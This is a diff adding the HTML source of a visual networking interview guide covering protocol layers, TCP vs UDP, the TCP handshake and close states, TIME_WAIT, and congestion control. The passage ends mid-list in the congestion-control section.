@@ -1,0 +1,1022 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Networking — The Visual Engineering & Interview Guide</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Shantell+Sans:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500&family=Newsreader:ital,opsz,wght@0,6..72,400;0,6..72,500;0,6..72,600;1,6..72,400;1,6..72,500&family=Nunito:wght@600;700;800&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+<style>
+  :root{
+    --bg:#f4efe4; --panel:#fffdf8; --panel2:#f2ece0; --border:#e4dccc;
+    --text:#2c2823; --muted:#6f6657; --red:#3367b5; --red2:#274f8c;
+    --accent:#2f6f9f; --green:#3f7d4e; --amber:#9a7416; --purple:#7a5aa8;
+    --mono:"SF Mono", "JetBrains Mono",Consolas,monospace;
+    --serif:"Newsreader","Iowan Old Style",Georgia,"Times New Roman",serif;
+    --display:"Shantell Sans","Bradley Hand",cursive;
+    --sans:"Nunito",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    --hand:"Shantell Sans","Bradley Hand",cursive;
+  }
+  *{box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{margin:0;background:var(--bg);color:var(--text);font-family:var(--serif);line-height:1.72;font-size:18px;font-weight:400}
+  a{color:var(--accent);text-decoration:none}
+  a:hover{text-decoration:underline}
+  code{font-family:var(--mono);background:#f1e9da;padding:.1em .4em;border-radius:5px;font-size:.82em;color:#a83a25}
+  pre{background:#2c2620;border:1px solid #4a4238;border-radius:10px;padding:14px 16px;overflow-x:auto;font-family:var(--mono);font-size:.82em;line-height:1.55}
+  pre code{background:none;padding:0;color:#ece3d2}
+
+  /* layout */
+  .wrap{display:grid;grid-template-columns:268px 1fr;max-width:1400px;margin:0 auto;background:var(--panel);box-shadow:0 0 40px rgba(31,38,48,.06)}
+  nav.toc{position:sticky;top:0;align-self:start;height:100vh;overflow-y:auto;padding:28px 18px;border-right:1px solid var(--border);background:#efe8db}
+  nav.toc h2{font-size:.72rem;text-transform:uppercase;letter-spacing:.13em;color:var(--muted);margin:22px 0 8px}
+  nav.toc h2:first-child{margin-top:0}
+  nav.toc a{display:block;color:var(--muted);padding:5px 10px;border-radius:7px;font-size:.88rem;border-left:2px solid transparent}
+  nav.toc a:hover{background:#ece3d4;color:var(--text);text-decoration:none}
+  nav.toc a.active{color:var(--red2);border-left-color:var(--red);background:#f6e4dd;font-weight:600}
+  main{padding:38px 46px 120px;min-width:0}
+
+  /* hero */
+  .hero{border:1px solid var(--border);border-radius:18px;padding:34px 36px;background:
+     radial-gradient(900px 300px at 0% 0%, rgba(51,103,181,.12), transparent 60%),
+     linear-gradient(180deg,#fffdf8,#f3ecdf);margin-bottom:30px}
+  .hero h1{margin:0 0 10px;font-family:var(--display);font-weight:500;font-size:2.9rem;letter-spacing:-.01em;color:#1c1814;line-height:1.08}
+  .hero .logo{color:var(--red)}
+  .hero p{margin:10px 0 0;color:#5c5346;max-width:720px;font-size:1.08rem;line-height:1.6}
+  .pills{margin-top:18px;display:flex;gap:8px;flex-wrap:wrap}
+  .pill{font-size:.76rem;padding:5px 11px;border:1px solid var(--border);border-radius:999px;color:var(--muted);background:#efe8db}
+
+  section{margin:46px 0;scroll-margin-top:20px}
+  section>h2{font-family:var(--display);font-weight:500;font-size:2.1rem;letter-spacing:-.01em;border-bottom:1px solid var(--border);padding-bottom:10px;margin-bottom:18px;color:#1c1814;line-height:1.15}
+  section>h2 .num{color:var(--red);font-family:var(--display);font-weight:600;font-style:italic;font-size:1.5rem;margin-right:12px}
+  h3{font-family:var(--display);font-weight:500;font-size:1.5rem;margin:32px 0 8px;color:#1c1814;line-height:1.2}
+  h4{font-family:var(--display);font-size:1.08rem;margin:20px 0 6px;color:var(--red2);font-weight:600}
+
+  .card{background:#fffdf8;border:1px solid var(--border);border-radius:14px;padding:20px 22px;margin:16px 0;box-shadow:0 1px 3px rgba(31,38,48,.04)}
+  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+  .grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+  @media(max-width:1050px){.grid2,.grid3{grid-template-columns:1fr}}
+
+  table{width:100%;border-collapse:collapse;margin:12px 0;font-size:.92rem;background:var(--panel);border:1px solid var(--border);border-radius:10px;overflow:hidden}
+  th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--border);vertical-align:top}
+  th{color:var(--muted);font-weight:600;font-size:.78rem;text-transform:uppercase;letter-spacing:.06em;background:#f1ebdf}
+  td code{white-space:nowrap}
+  tr:last-child td{border-bottom:none}
+  tr:hover td{background:#f6f0e5}
+
+  .note{border-left:3px solid var(--accent);background:#eef4ff;padding:12px 16px;border-radius:0 10px 10px 0;margin:14px 0;font-size:.92rem}
+  .warn{border-left:3px solid var(--amber);background:#fdf6e3;padding:12px 16px;border-radius:0 10px 10px 0;margin:14px 0;font-size:.92rem}
+  .tip{border-left:3px solid var(--green);background:#ecf8ef;padding:12px 16px;border-radius:0 10px 10px 0;margin:14px 0;font-size:.92rem}
+  .iq{border-left:3px solid var(--purple);background:#f4effe;padding:12px 16px;border-radius:0 10px 10px 0;margin:14px 0;font-size:.92rem}
+  .iq::before{content:"💬 Interview angle";display:block;font-family:var(--hand);font-weight:700;color:var(--purple);font-size:1.25rem;margin-bottom:2px;letter-spacing:.01em}
+
+  .mermaid{background:#fffdf8;border:1px solid var(--border);border-radius:12px;padding:18px;margin:16px 0;text-align:center}
+  .tag{display:inline-block;font-family:var(--sans);font-weight:700;font-size:.72rem;padding:2px 8px;border-radius:6px;margin-left:8px;vertical-align:middle}
+  .t-on{background:#e6f6ea;color:#1a8f3c;border:1px solid #b6e3c2}
+  .t-off{background:#fdeceb;color:#c52a20;border:1px solid #f4c4c0}
+  .t-warn{background:#fdf6e3;color:#9a7100;border:1px solid #ecd9a0}
+
+  .big{font-size:2.5rem;font-weight:500;color:var(--red);font-family:var(--display);line-height:1.05;letter-spacing:-.01em}
+  .kv{color:var(--muted);font-size:.85rem}
+  .legend{display:flex;gap:18px;flex-wrap:wrap;font-size:.82rem;color:var(--muted);margin-top:8px}
+  .legend b{color:var(--text)}
+  hr{border:none;border-top:1px solid var(--border);margin:26px 0}
+  .footer{color:var(--muted);font-size:.85rem;text-align:center;padding:30px 0;border-top:1px solid var(--border)}
+
+  /* ---- FUN: analogy callout ---- */
+  .analogy{border-left:3px solid #d6489b;background:#fdeef6;padding:12px 16px;border-radius:0 10px 10px 0;margin:14px 0;font-size:.92rem}
+  .analogy::before{content:"🎭 Real-world analogy";display:block;font-family:var(--hand);font-weight:700;color:#c43d8a;font-size:1.25rem;margin-bottom:2px;letter-spacing:.01em}
+
+  /* ---- FUN: progress bar ---- */
+  #progbar{position:fixed;top:0;left:0;height:3px;width:0;background:linear-gradient(90deg,var(--red),var(--amber),var(--green));z-index:50;transition:width .1s ease-out;box-shadow:0 0 8px rgba(220,56,45,.4)}
+
+  /* ---- FUN: flashcards ---- */
+  .deck{display:grid;grid-template-columns:repeat(2,1fr);gap:14px;margin:16px 0}
+  @media(max-width:1050px){.deck{grid-template-columns:1fr}}
+  .flip{background:transparent;perspective:1200px;height:158px;cursor:pointer;border:none;padding:0;font-family:inherit;text-align:left}
+  .flip-inner{position:relative;width:100%;height:100%;transition:transform .55s cubic-bezier(.4,.2,.2,1);transform-style:preserve-3d}
+  .flip.flipped .flip-inner{transform:rotateY(180deg)}
+  .flip-face{position:absolute;inset:0;backface-visibility:hidden;border:1px solid var(--border);border-radius:14px;padding:16px 18px;display:flex;flex-direction:column;justify-content:center;overflow:auto;box-shadow:0 2px 6px rgba(31,38,48,.07)}
+  .flip-front{background:linear-gradient(160deg,#fffdf8,#f0e9da);border-color:#e0d8c6}
+  .flip-front .q{font-family:var(--display);font-weight:500;color:#1c1814;font-size:1.15rem;line-height:1.25}
+  .flip-front .hint{color:var(--red);font-size:.74rem;margin-top:10px;font-weight:600}
+  .flip-back{background:linear-gradient(160deg,#ecf8ef,#e0f2e6);transform:rotateY(180deg);border-color:#9fd8b0;font-size:.9rem;color:#1d3326}
+  .flip-back code{font-size:.82em;background:#d4ecdb;color:#0f5b2a}
+  .deckbar{display:flex;align-items:center;gap:14px;margin:10px 0 0;color:var(--muted);font-size:.85rem;flex-wrap:wrap}
+  .btn{background:var(--panel);border:1px solid var(--border);color:var(--text);padding:7px 14px;border-radius:9px;cursor:pointer;font-family:var(--sans);font-weight:700;font-size:.85rem;transition:.15s}
+  .btn:hover{border-color:var(--red);color:var(--red2);background:#f6e4dd}
+
+  /* ---- FUN: reveal Q&A (boss level) ---- */
+  .qa{border:1px solid var(--border);border-radius:12px;margin:12px 0;overflow:hidden;background:var(--panel);box-shadow:0 1px 3px rgba(60,50,30,.05)}
+  .qa>summary{cursor:pointer;padding:14px 18px;font-family:var(--display);font-weight:500;font-size:1.12rem;list-style:none;display:flex;align-items:center;gap:10px;color:#1c1814}
+  .qa>summary::-webkit-details-marker{display:none}
+  .qa>summary::before{content:"🎯";font-size:1rem}
+  .qa>summary::after{content:"▸ tap to reveal";margin-left:auto;color:var(--muted);font-size:.78rem;font-weight:400}
+  .qa[open]>summary::after{content:"▾ answer"}
+  .qa[open]>summary{border-bottom:1px solid var(--border);background:#f6f0e5}
+  .qa .ans{padding:14px 18px;font-size:.92rem;color:#2a3340;animation:fade .4s ease}
+  @keyframes fade{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:none}}
+  .boss{display:inline-block;background:#fdeceb;border:1px solid var(--red);color:var(--red2);font-size:.7rem;font-weight:800;letter-spacing:.04em;padding:2px 8px;border-radius:6px;font-family:var(--sans);margin-left:8px}
+  .lvl1{color:#1a8f3c}.lvl2{color:#b8860b}.lvl3{color:#c52a20}
+
+  /* ---- FUN: emoji bullets / sparkle ---- */
+  .tldr{background:linear-gradient(135deg,#fdf6e3,#fbf0d0);border:1px dashed #ecd9a0;border-radius:12px;padding:14px 18px;margin:14px 0}
+  .tldr b{color:#9a7100}
+  .xp{display:inline-flex;align-items:center;gap:6px;background:#f1ebdf;border:1px solid var(--border);border-radius:999px;padding:3px 10px;font-size:.8rem;color:var(--muted);font-family:var(--sans);font-weight:700}
+</style>
+</head>
+<body>
+<div id="progbar"></div>
+<div class="wrap">
+
+<nav class="toc" id="toc">
+  <h2>Overview</h2>
+  <a href="#map">The big picture</a>
+  <h2>Models</h2>
+  <a href="#models">OSI / TCP-IP layers</a>
+  <h2>Transport</h2>
+  <a href="#tcpudp">TCP vs UDP</a>
+  <a href="#handshake">3-way handshake</a>
+  <a href="#wave">4-way wave & TIME_WAIT</a>
+  <a href="#reliability">Reliability & congestion</a>
+  <h2>The Web (HTTP)</h2>
+  <a href="#http">HTTP basics</a>
+  <a href="#versions">HTTP/1 · 2 · 3</a>
+  <a href="#https">HTTPS & TLS</a>
+  <h2>State & real-time</h2>
+  <a href="#state">Cookie · Session · JWT</a>
+  <a href="#realtime">WebSocket & SSE</a>
+  <a href="#llmgw">LLM Gateway</a>
+  <h2>Infrastructure</h2>
+  <a href="#dns">DNS</a>
+  <a href="#url">Type a URL → page</a>
+  <h2>Security</h2>
+  <a href="#security">XSS · CSRF · more</a>
+  <h2>Reference</h2>
+  <a href="#cheatsheet">Cheat sheet</a>
+  <h2>Practice 🎮</h2>
+  <a href="#quiz">Self-test flashcards</a>
+  <a href="#boss">Boss-level questions</a>
+</nav>
+
+<main>
+  <div class="hero">
+    <h1><span class="logo">📡 Networking</span> — Visual Engineering &amp; Interview Guide</h1>
+    <p style="margin:0 0 0;font-size:.85rem"><a href="zh/network-guide.html">中文版本 →</a></p>
+    <p>The protocols a backend interview actually asks about — TCP's handshakes &amp; reliability, HTTP/1·2·3, HTTPS/TLS, cookies vs JWT, WebSocket vs SSE, DNS, and exactly what happens when you type a URL. One scannable page with diagrams.</p>
+    <p style="color:#c43d8a;margin-top:14px;font-size:.95rem">🕹️ <b>How to play:</b> scroll to learn (watch the progress bar up top), hit the 🎭 analogies, flip the 🃏 flashcards in <a href="#quiz">§16</a>, then unlock the 🎯 <a href="#boss">boss-level questions</a>.</p>
+    <div class="pills">
+      <span class="pill">3-way handshake</span>
+      <span class="pill">TIME_WAIT · 2MSL</span>
+      <span class="pill">HTTP/2 multiplexing</span>
+      <span class="pill">TLS handshake</span>
+      <span class="pill">Cookie vs JWT</span>
+      <span class="pill">WebSocket vs SSE</span>
+    </div>
+  </div>
+
+  <!-- ============ BIG PICTURE ============ -->
+  <section id="map">
+    <h2><span class="num">00</span>The big picture — one map to memorize</h2>
+    <div class="tldr"><b>The spine:</b> the raw network (IP) only delivers best-effort packets → <b>TCP</b> turns that into a reliable, ordered stream → <b>HTTP</b> rides on TCP (and <b>HTTPS</b> = HTTP wrapped in <b>TLS</b>) → cookies/JWT add state and WebSocket/SSE add real-time on top → but first <b>DNS</b> turns a name into an IP. "Type a URL" is just all of these firing in order.</div>
+    <div class="mermaid">
+flowchart TB
+    DNS["DNS — name → IP<br/>(happens first)"]:::core --> IP
+    IP["IP — best-effort packets<br/>unreliable, unordered"]:::core --> TCP["TCP — reliable ordered stream<br/>handshake · seq/ack · windows"]:::feat
+    IP --> UDP["UDP — fast, connectionless"]:::feat
+    TCP --> HTTP["HTTP — request / response"]:::feat
+    HTTP --> TLS["HTTPS = HTTP + TLS"]:::feat
+    HTTP --> ST["state: cookie · session · JWT"]:::feat
+    HTTP --> RT["real-time: WebSocket · SSE"]:::feat
+    HTTP --> SEC["security: XSS · CSRF · DDoS"]:::edge
+    click DNS href "#dns" "DNS" _self
+    click TCP href "#handshake" "TCP handshake" _self
+    click UDP href "#tcpudp" "TCP vs UDP" _self
+    click HTTP href "#http" "HTTP basics" _self
+    click TLS href "#https" "HTTPS & TLS" _self
+    click ST href "#state" "Cookie · Session · JWT" _self
+    click RT href "#realtime" "WebSocket & SSE" _self
+    click SEC href "#security" "Web security" _self
+    classDef core fill:#e3edf8,stroke:#3367b5,color:#1f3a66;
+    classDef feat fill:#fbf3da,stroke:#c9a83a,color:#6b5212;
+    classDef edge fill:#fdeceb,stroke:#c52a20,color:#7a1810;
+    </div>
+    <p style="text-align:center;color:var(--muted);font-size:.82rem;margin:-4px 0 10px">👆 tap any box to jump to the section that explains it</p>
+  </section>
+
+  <!-- ============ MODELS ============ -->
+  <section id="models">
+    <h2><span class="num">01</span>Network models — the layer cake</h2>
+    <p>Networking is layered so each level only worries about its own job and treats the layer below as a pipe. Two models: the academic <b>OSI 7-layer</b> and the practical <b>TCP/IP 4-layer</b> that the internet actually runs.</p>
+    <table>
+      <tr><th>TCP/IP (4)</th><th>≈ OSI</th><th>Job</th><th>Examples</th></tr>
+      <tr><td><b>Application</b></td><td>App + Presentation + Session</td><td>What the data <i>means</i></td><td>HTTP, DNS, TLS, WebSocket</td></tr>
+      <tr><td><b>Transport</b></td><td>Transport</td><td>End-to-end delivery between processes (ports)</td><td><b>TCP</b>, <b>UDP</b></td></tr>
+      <tr><td><b>Internet</b></td><td>Network</td><td>Route packets host-to-host across networks</td><td><b>IP</b>, ICMP (ping)</td></tr>
+      <tr><td><b>Link</b></td><td>Data-link + Physical</td><td>Move frames on the local wire</td><td>Ethernet, ARP, Wi-Fi</td></tr>
+    </table>
+    <div class="analogy">Mailing a letter maps the four layers cleanly — top → bottom, each <b>wrapping</b> the one above (encapsulation):
+      <ul style="margin:6px 0 0">
+        <li><b>Application</b> (HTTP/DNS) = the <b>letter's content</b>, plus both sides agreeing on a <b>language</b> to read it — the meaning.</li>
+        <li><b>Transport</b> (TCP/UDP, ports) = sealing it in an <b>envelope</b> addressed to a specific <b>person/department</b> in the building (port = which process). TCP = <b>registered mail with a return receipt</b> (guaranteed, re-sent if lost); UDP = a <b>postcard</b> (drop it and hope).</li>
+        <li><b>Internet</b> (IP) = the <b>building's street address</b> (IP), which the postal network <b>routes hop by hop</b> to the right city.</li>
+        <li><b>Link</b> (Ethernet/ARP, MAC) = the actual <b>trucks/carriers</b> moving it between two adjacent stops, using local "which door" info (MAC); ARP = asking "which mailbox is this?" on the local street.</li>
+      </ul>
+    </div>
+    <div class="iq">Know where things live: <b>HTTP</b> is application-layer, <b>TCP/UDP</b> are transport-layer (they use <b>ports</b>), <b>IP</b> is the internet/network layer (it uses <b>IP addresses</b>), and a <b>MAC</b> address lives at the link layer. A common question: "is a Socket a protocol?" — no, it's an <b>API</b> your app uses to talk to the transport layer.</div>
+  </section>
+
+  <!-- ============ TCP vs UDP ============ -->
+  <section id="tcpudp">
+    <h2><span class="num">02</span>TCP vs UDP</h2>
+    <p>The two transport protocols. <b>TCP</b> is a reliable, ordered, connection-oriented <i>stream</i>; <b>UDP</b> is a fire-and-forget <i>datagram</i> with almost no guarantees — but tiny and fast.</p>
+    <table>
+      <tr><th></th><th>TCP</th><th>UDP</th></tr>
+      <tr><td>Connection</td><td>Connection-oriented (handshake first)</td><td>Connectionless (just send)</td></tr>
+      <tr><td>Reliable / ordered</td><td>Yes — acks + retransmit + sequencing</td><td>No — may drop, dup, reorder</td></tr>
+      <tr><td>Flow / congestion control</td><td>Yes</td><td>No</td></tr>
+      <tr><td>Header</td><td>20+ bytes</td><td>8 bytes</td></tr>
+      <tr><td>Shape</td><td>Byte <b>stream</b> (no message boundaries)</td><td>Discrete <b>datagrams</b> (boundaries kept)</td></tr>
+      <tr><td>Use for</td><td>Web, APIs, files, DB — correctness matters</td><td>DNS, video/voice, gaming — speed &gt; perfection</td></tr>
+    </table>
+    <div class="analogy">TCP is a <b>phone call</b>: you dial, both say "hello?" (handshake), and you confirm you're heard ("...right?", "yeah"). UDP is <b>shouting across a room</b>: instant, no setup — but you never know if they caught every word.</div>
+    <div class="note"><b>The "sticky packet" (粘包) gotcha:</b> because TCP is a byte stream with no message boundaries, two sends can arrive glued together (or split). The app must frame messages itself — by a <b>length prefix</b>, a <b>delimiter</b>, or fixed-size records. UDP doesn't have this problem (each datagram is one message).</div>
+  </section>
+
+  <!-- ============ HANDSHAKE ============ -->
+  <section id="handshake">
+    <h2><span class="num">03</span>TCP three-way handshake</h2>
+    <p>Before any data, TCP sets up a connection and <b>synchronizes sequence numbers</b> both ways. It takes three messages:</p>
+    <div class="mermaid">
+sequenceDiagram
+    participant C as Client
+    participant S as Server
+    Note over C: CLOSED → SYN_SENT
+    C->>S: ① SYN (seq=x)
+    Note over S: LISTEN → SYN_RCVD
+    S->>C: ② SYN+ACK (seq=y, ack=x+1)
+    Note over C: → ESTABLISHED
+    C->>S: ③ ACK (ack=y+1)
+    Note over S: → ESTABLISHED
+    </div>
+    <h4>Why three, not two?</h4>
+    <div class="note"><b>Two terms first.</b> An <b>"old" (historical) connection</b> = a SYN from a <i>previous</i> connection that got delayed in the network and turns up late. An <b>RST</b> ("reset") = a TCP segment that means "abort — there's no valid connection here", tearing it down immediately (unlike the graceful FIN close).</div>
+    <p>The third handshake exists mainly to handle exactly that stale SYN. Three reasons (referencing ① ② ③ above):</p>
+    <ol>
+      <li><b>Reject old / duplicate connections — the main reason.</b> Say the client's first <b>① SYN (seq=90)</b> gets stuck in the network, so it times out and sends a new <b>① SYN (seq=100)</b>. If the <i>old</i> seq=90 SYN later reaches the server, the server replies <b>② SYN-ACK (ack=91)</b>. The client sees ack=91 but is expecting 101 (it sent seq=100), realizes this is a stale connection, and sends an <b>RST</b> instead of <b>③</b> — so the server drops it and never opens a zombie. A two-way handshake has no third leg, so the server would wrongly establish that old connection.</li>
+      <li><b>Synchronize both sequence numbers.</b> Each side's initial seq must be acked by the other: <b>①</b> carries the client's seq; <b>②</b> acks it <i>and</i> carries the server's seq; <b>③</b> acks the server's. That's four logical confirmations, but ②'s ACK and SYN merge into one packet → three messages. (After only two, the server's seq is still unacknowledged.)</li>
+      <li><b>Avoid wasting resources.</b> With two handshakes the server would open a connection (allocate buffers) the instant it sees a SYN — including duplicate/retransmitted SYNs — piling up wasted half-open connections. The <b>③</b> ACK confirms the client is really there before the server commits.</li>
+    </ol>
+    <div class="warn"><b>SYN flood:</b> an attacker sends many SYNs but never the final ACK, filling the <b>half-open (SYN) queue</b>. Mitigate with <b>SYN cookies</b> (don't allocate state until the ACK returns), a bigger backlog, or shorter SYN-ACK retries.</div>
+    <h4>The two queues behind a handshake</h4>
+    <p>While connections are being set up, the kernel holds two queues:</p>
+    <table>
+      <tr><th>Queue</th><th>Holds</th><th>Filled / drained</th></tr>
+      <tr><td><b>Half-connection</b> (SYN queue)</td><td>connections that got ① and replied ②, but haven't seen ③ yet (state SYN_RCVD)</td><td>filled by ①; an entry moves out when ③ arrives</td></tr>
+      <tr><td><b>Full-connection</b> (accept queue)</td><td>fully established connections waiting for the app to <code>accept()</code> them</td><td>filled when ③ arrives; drained by <code>accept()</code></td></tr>
+    </table>
+    <p>If the app is slow to <code>accept()</code>, the accept queue fills and new connections get dropped. A <b>SYN flood</b> attacks the <i>other</i> queue — floods of ① with no ③ pile up in the SYN queue; <b>SYN cookies</b> defeat it by encoding the connection state into ②'s sequence number and rebuilding it from the returning ③, so no memory is held until ③ comes back.</p>
+
+    <h4>When a handshake segment is lost</h4>
+    <table>
+      <tr><th>Lost</th><th>What happens</th></tr>
+      <tr><td><b>① SYN</b></td><td>The client times out and retransmits the SYN (<code>tcp_syn_retries</code>), with exponential backoff.</td></tr>
+      <tr><td><b>② SYN-ACK</b></td><td>Both sides retransmit: the client re-sends ① (it never saw ②), the server re-sends ② (<code>tcp_synack_retries</code>).</td></tr>
+      <tr><td><b>③ ACK</b></td><td>The server stays in SYN_RCVD and retransmits ②; the client (already ESTABLISHED) re-ACKs — or its first data segment carries the ACK and fixes it.</td></tr>
+    </table>
+  </section>
+
+  <!-- ============ WAVE ============ -->
+  <section id="wave">
+    <h2><span class="num">04</span>TCP four-way wave &amp; TIME_WAIT</h2>
+    <p>Closing takes <b>four</b> messages because TCP is full-duplex — each side closes its own direction independently. The side that sends data may still have some to flush after the other side is done.</p>
+    <div class="mermaid">
+sequenceDiagram
+    participant C as Client (active close)
+    participant S as Server
+    C->>S: 1. FIN
+    Note over C: FIN_WAIT_1
+    S->>C: 2. ACK
+    Note over S: CLOSE_WAIT (may still send)
+    Note over C: FIN_WAIT_2
+    S->>C: 3. FIN
+    Note over S: LAST_ACK
+    C->>S: 4. ACK
+    Note over C: TIME_WAIT (wait 2 MSL)
+    Note over C,S: both → CLOSED
+    </div>
+    <h4>The connection states, decoded</h4>
+    <table>
+      <tr><th>State</th><th>Side</th><th>Meaning</th></tr>
+      <tr><td><b>FIN_WAIT_1</b></td><td>active closer</td><td>Sent my FIN, waiting for it to be ACKed.</td></tr>
+      <tr><td><b>FIN_WAIT_2</b></td><td>active closer</td><td>My FIN was ACKed (my send half is closed); now waiting for the peer to send <i>its</i> FIN.</td></tr>
+      <tr><td><b>TIME_WAIT</b></td><td>active closer</td><td>Got the peer's FIN, sent the last ACK, now waiting 2 MSL.</td></tr>
+      <tr><td><b>CLOSE_WAIT</b></td><td>passive closer</td><td>Got the peer's FIN but not done sending yet. <b>Many stuck here = an app bug: it forgot to <code>close()</code>.</b></td></tr>
+      <tr><td><b>LAST_ACK</b></td><td>passive closer</td><td>Sent my own FIN, waiting for the final ACK.</td></tr>
+    </table>
+    <p>FIN_WAIT splits into 1 and 2 because the peer's ACK and its FIN are usually <i>separate</i> messages — exactly why close takes four steps.</p>
+    <div class="iq"><b>Why three handshakes but four waves?</b> On connect, the server's SYN and ACK combine into one packet. On close, the server's ACK (of your FIN) and its own FIN usually <b>can't</b> combine — it sends the ACK immediately but may still have data to send before its own FIN, so they're separate.</div>
+    <div class="warn"><b>Why TIME_WAIT, and why 2× MSL?</b> The side that <i>actively closes</i> waits ~2 MSL (Maximum Segment Lifetime) before fully closing:
+      <ol style="margin:6px 0 0">
+        <li>The closer's <b>last message is itself an ACK</b> (acknowledging the peer's FIN) — it is <i>not</i> waiting to receive an ACK. If that ACK is lost, the peer (still waiting for it in LAST_ACK) retransmits its FIN; 2 MSL covers exactly one round (1 MSL for the ACK to be presumed lost + 1 MSL for the retransmitted FIN to return), so the closer is still alive to <b>re-send that ACK</b>. (Had it fully closed, it would reply RST and the peer could never close cleanly.)</li>
+        <li>It lets <b>stray old packets from this connection die out</b>. A connection is identified by its 4-tuple (local IP+port, remote IP+port). If a delayed or retransmitted packet from the old connection is still wandering the network, and you <i>immediately</i> reuse the same port-pair for a new connection, that ghost packet could arrive with a seq that lands inside the new connection's receive window and be accepted as <b>valid data</b> → corruption. Waiting 2 MSL (MSL = the longest a packet can survive in transit) guarantees every old packet has expired first, so the reused port-pair starts clean.</li>
+      </ol>
+      <b>The cost — port exhaustion (follow the chain):</b> every <i>outbound</i> connection needs a <b>local source port</b>, taken from the ephemeral pool (only tens of thousands of ports). When a connection <i>actively closes</i>, that local port is pinned in TIME_WAIT for ~2 MSL (1–4 min) before it can be reused. So a machine that opens and closes a flood of <b>short connections</b> (classically, a service making many quick calls to a backend) piles up TIME_WAITs that slowly use up the whole ephemeral pool → eventually it <b>can't open new outbound connections</b>. The fix is to stop opening/closing so often — reuse connections with <b>keep-alive / a connection pool</b> — not to blindly disable TIME_WAIT, which exists for correctness. (This hits the side that <i>initiates</i> connections — e.g. a server acting as a client to a backend — not a plain listening port.)</div>
+  </section>
+
+  <!-- ============ RELIABILITY ============ -->
+  <section id="reliability">
+    <h2><span class="num">05</span>How TCP stays reliable (&amp; polite)</h2>
+    <p>TCP layers several mechanisms on top of unreliable IP:</p>
+    <div class="grid2">
+      <div class="card"><h4>Ordering &amp; loss</h4><p><b>Sequence numbers</b> order bytes and detect gaps/duplicates; the receiver sends <b>ACKs</b>; unacked data is <b>retransmitted</b> (on timeout, or fast-retransmit after 3 duplicate ACKs).</p></div>
+      <div class="card"><h4>Flow control</h4><p>The receiver advertises a <b>window (rwnd)</b> — "I have this much buffer free" — so a fast sender can't overwhelm a slow receiver. A <b>sliding window</b> lets many bytes be in flight without waiting per-packet.</p></div>
+    </div>
+    <h3>Congestion control — don't melt the network</h3>
+    <p>Flow control protects the <i>receiver</i>; <b>congestion control</b> protects the <i>network</i>. The sender keeps a congestion window (<b>cwnd</b>) and probes for capacity:</p>
+    <h4>Terms used below</h4>
+    <table>
+      <tr><th>Term</th><th>Meaning</th></tr>
+      <tr><td><b>MSS</b> · Maximum Segment Size</td><td>The most data TCP puts in one segment (~1460 bytes on Ethernet). cwnd and ssthresh are counted in MSS units.</td></tr>
+      <tr><td><b>RTT</b> · Round-Trip Time</td><td>The time for a packet to go out and its ACK to come back.</td></tr>
+      <tr><td><b>cwnd</b> · congestion window</td><td>The sender's own estimate of how much unacked data it may currently put on the network.</td></tr>
+      <tr><td><b>ssthresh</b> · slow-start threshold</td><td>The line between the phases: below it cwnd grows exponentially, above it linearly.</td></tr>
+      <tr><td><b>rwnd</b> · receive window</td><td>What the <i>receiver</i> advertises as free buffer. The sender actually uses <code>min(cwnd, rwnd)</code>.</td></tr>
+    </table>
+    <ol>
+      <li><b>Slow start:</b> cwnd starts at <b>1 MSS</b> and grows by 1 for <i>every ACK</i> — so it roughly <b>doubles each RTT</b> (exponential) until it reaches the threshold <code>ssthresh</code>.</li>
+      <li><b>Congestion avoidance:</b> past <code>ssthresh</code>, grow gently — <code>+1/cwnd</code> per ACK, i.e. about <b>+1 MSS per RTT</b> (linear).</li>
+      <li><b>On loss — two cases:</b> a <b>timeout</b> is treated as severe → <code>ssthresh = cwnd/2</code> and cwnd drops all the way to <b>1</b> (restart slow start). <b>3 duplicate ACKs</b> is milder (packets are still getting through) → <code>ssthresh = cwnd/2</code>, then <code>cwnd = ssthresh + 3</code> (fast retransmit + fast recovery), and the sender resumes <b>congestion avoidance</b>, not slow start.</li>
+    </ol>
+    <div class="note"><b>Two bits from above, unpacked.</b> <b>"+1/cwnd per ACK"</b> is just the math that yields "+1 MSS per RTT": one RTT sends ~cwnd packets and gets ~cwnd ACKs, so adding 1/cwnd on each grows the window by exactly 1 MSS over the whole round (vs slow start, which adds 1 per ACK → +cwnd per RTT → doubling). <b>Duplicate ACKs:</b> TCP ACKs are <i>cumulative</i> — an ACK means "I have everything up to N, send N next." If packet N is lost but N+1, N+2, N+3 still arrive, each one makes the receiver repeat the <i>same</i> "send N" ACK — a duplicate. So <b>3 duplicate ACKs</b> means N was lost <i>but later packets are still getting through</i> (they're what produced the duplicates) — the pipe is flowing, just patch the one gap (fast retransmit). A <b>timeout</b> means you heard <i>nothing</i> back — possibly the whole path is dead, so cwnd crashes to 1.</div>
+    <h4>Worked example — cwnd step by step</h4>
+    <p>Start with cwnd = 1 MSS and ssthresh = 16. Each row is one RTT:</p>
+    <table>
+      <tr><th>RTT</th><th>cwnd</th><th>phase / event</th></tr>
+      <tr><td>1</td><td>1</td><td>slow start</td></tr>
+      <tr><td>2</td><td>2</td><td>slow start (×2 per RTT)</td></tr>
+      <tr><td>3</td><td>4</td><td>slow start</td></tr>
+      <tr><td>4</td><td>8</td><td>slow start</td></tr>
+      <tr><td>5</td><td>16</td><td>reached ssthresh → switch to congestion avoidance</td></tr>
+      <tr><td>6</td><td>17</td><td>congestion avoidance (+1 per RTT)</td></tr>
+      <tr><td>7</td><td>18</td><td>congestion avoidance</td></tr>
+      <tr><td>8</td><td>19</td><td>congestion avoidance</td></tr>
+      <tr><td>9</td><td>20</td><td>⚠️ packet lost here</td></tr>
+    </table>
+    <p>What happens at the loss (cwnd = 20) depends on how it was detected:</p>
+    <ul>
